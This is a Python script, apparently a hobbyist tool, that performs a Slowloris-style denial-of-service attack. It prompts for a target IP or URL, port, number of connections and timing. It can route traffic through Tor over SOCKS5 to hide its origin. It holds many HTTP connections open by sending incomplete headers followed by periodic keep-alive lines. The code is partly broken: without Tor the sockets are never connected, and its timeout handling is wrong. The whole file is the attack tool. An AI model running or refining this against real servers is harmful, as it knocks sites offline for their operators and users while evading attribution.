#author - Dund33
#This script is just quick and dirty version. It will be improved over time...
#trust me...
#credits for Dan Haim(negativeiq@users.sourceforge.net) for SocksiPy 
#http://sourceforge.net/projects/socksipy
import socks
import socket
import time
import math
import sys

swt=0.12

def make_array(n_nodes, proxy_host, proxy_port):
 sockets = []
 for i in range(0,n_nodes):
  s=socks.socksocket()
  s.setproxy(socks.PROXY_TYPE_SOCKS5, proxy_host, proxy_port)
  sockets.append(s)
 return sockets

def make_array_no_proxy(n_nodes):
 sockets = []
 for i in range(0,n_nodes):
  s=socket.socket()
  sockets.append(s)
 return sockets


def print_slowly(text,delay):
   for l in text:
     sys.stdout.write(l)
     sys.stdout.flush()
     time.sleep(delay)
  

def connect_da_sockets(sockets, server, port):
 for s in sockets:
  s.connect((server,port))


def send_headers(sockets,tip):
 for s in sockets:
  s.send("GET / HTTP/1.1\r\n")
  s.send("Host:"+tip+"\r\n")
  s.send("Accept: */*\r\n")
  s.send("Accept-Language: en-us\r\n")
  s.send("Connection: keep-alive\r\n")

def end(sockets):
  for s in sockets:
   s.send("\r\n")

def keep_up(sockets, server, port):
 for s in sockets:
  try:
   s.send("X-a: b\r\n")
  except s.timeout:
   print("node dead adding new one")
   s.remove(s)
   newsock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   newsock.connect((server,port))
   
print_slowly("Use tor?(yes/no):",swt)
usetor=raw_input()
print_slowly('dns/ip: ',swt)
doip=raw_input()
if (doip=='dns'):
  print_slowly('Target URL: ',swt)
  tip=socket.gethostbyname (raw_input())
  print_slowly('IP resolved as: '+tip+'\r\n',swt)
else: 
  print_slowly('Target IP: ',swt)
  tip=raw_input()
print_slowly('Target port: ',swt)
tp=input()
print_slowly('N of nodes: ',swt)
non=input()
print_slowly('keep up time: ',swt)
kut=input()
print_slowly('total time: ',swt)
tot=input()
  

nor=int(math.floor(tot/kut)) #number of keep-up messages

if nor==0:
 print_slowly("error keep up must be longer than test duration!",swt)
else:
 if(usetor.lower()=='yes'):
   print_slowly('Tor port: ',swt)
   torport=input()
   socket_array = make_array(non, '127.0.0.1',torport)
   try:
      connect_da_sockets(socket_array,tip,tp)
   except socket.error:
      print_slowly('couldnt connect...',swt)
      time.sleep(0.5)
      print_slowly('sorry...',swt)
      time.sleep(1)
      exit()
 else:
   socket_array = make_array_no_proxy(non) 
 
 print_slowly('Beginning test\r\n',swt)
 print_slowly('Sending headers\r\n',swt)
 send_headers(socket_array,tip)
 print_slowly('Headers sent\r\n',swt)

 

 for i in range(0,nor):
  keep_up(socket_array,tip,tp)
  time.sleep(kut)
 end(socket_array)
